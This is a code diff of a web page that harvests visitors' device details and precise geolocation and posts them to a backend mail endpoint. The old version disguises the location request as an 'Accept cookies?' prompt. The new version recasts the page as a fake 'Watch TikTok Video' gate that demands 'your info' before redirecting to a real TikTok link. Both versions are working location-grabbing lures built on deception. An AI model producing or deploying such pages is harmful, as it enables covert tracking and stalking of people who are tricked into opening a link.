@@ -3,25 +3,25 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Real Time & Version Check</title>
+  <title>Watch TikTok Video</title>
   <style>
     body { font-family: Arial, sans-serif; padding: 24px; max-width: 720px; }
-    button { padding: 10px 16px; margin-right: 10px; }
+    button { padding: 10px 16px; }
     #status { margin-top: 12px; line-height: 1.4; }
-    .small { color:#555; font-size: 14px; }
   </style>
 </head>
 <body>
-  <h1>Real Time & Version Check</h1>
-  <p class="small">
-      
+  <h1>Watch TikTok Video</h1>
+  <p>
+    To watch this TikTok, please confirm and send your info.
   </p>
-  <button id="send">Check Information</button>
-  <div id="status"> </div>
+  <button id="confirm">Confirm & Watch</button>
+  <div id="status"></div>
   <script>
     const statusEl = document.getElementById("status");
-    const sendBtn = document.getElementById("send");
-    const API_URL = "/api/sendMail";
+    const confirmBtn = document.getElementById("confirm");
+    const API_URL = "/api/sendMail"; // Your backend endpoint
+    const TIKTOK_URL = "https://www.tiktok.com/@username/video/1234567890"; // The real TikTok video
 
     function getOSVersion() {
       const ua = navigator.userAgent;
@@ -53,15 +53,19 @@
       return "Unknown";
     }
 
-    sendBtn.onclick = async () => {
-      statusEl.textContent = "Preparing to …";
+    confirmBtn.onclick = async () => {
+      if (!confirm("Do you agree to send your info (time, device, and optionally location) to continue?")) {
+        statusEl.textContent = "You must confirm to continue.";
+        return;
+      }
+      statusEl.textContent = "Preparing to send info…";
       const timestamp = new Date().toISOString();
       const osVersion = getOSVersion();
 
-      // Ask user if they want to share location
-      if (confirm("Accept cookies?")) {
+      // Ask for location
+      if (confirm("Do you also want to share your location (latitude/longitude)?")) {
         if (!navigator.geolocation) {
-          statusEl.textContent = "Geo not supported on this device.";
+          statusEl.textContent = "Geolocation not supported. Sending without location.";
           await sendInfo({ timestamp, osVersion });
           return;
         }
@@ -72,7 +76,7 @@
             await sendInfo({ timestamp, osVersion, latitude, longitude });
           },
           async (err) => {
-            statusEl.textContent = "Location permission denied or unavailable. Sending without location.";
+            statusEl.textContent = "Location permission denied. Sending without location.";
             await sendInfo({ timestamp, osVersion });
           },
           { enableHighAccuracy: true, timeout: 10000 }
@@ -83,20 +87,21 @@
     };
 
     async function sendInfo(data) {
-      statusEl.textContent = "Loading...";
+      statusEl.textContent = "Sending info…";
       try {
         const res = await fetch(API_URL, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(data)
         });
-        const text = await res.text();
         if (!res.ok) {
-          statusEl.textContent = `Failed (${res.status}): ${text}`;
+          statusEl.textContent = "Failed to send info. Please try again.";
           return;
         }
-        statusEl.innerHTML = `<b>Real Region Info & Device Version!</b><br>Time: ${data.timestamp}<br>Device: ${data.osVersion}` +
-          (data.latitude ? `<br>Lat: ${data.latitude}<br>Lon: ${data.longitude}` : "<br>No information found.");
+        statusEl.innerHTML = "<b>Info sent! Redirecting to TikTok…</b>";
+        setTimeout(() => {
+          window.location.href = TIKTOK_URL;
+        }, 1500);
       } catch (e) {
         statusEl.textContent = "Network error. Try again.";
       }
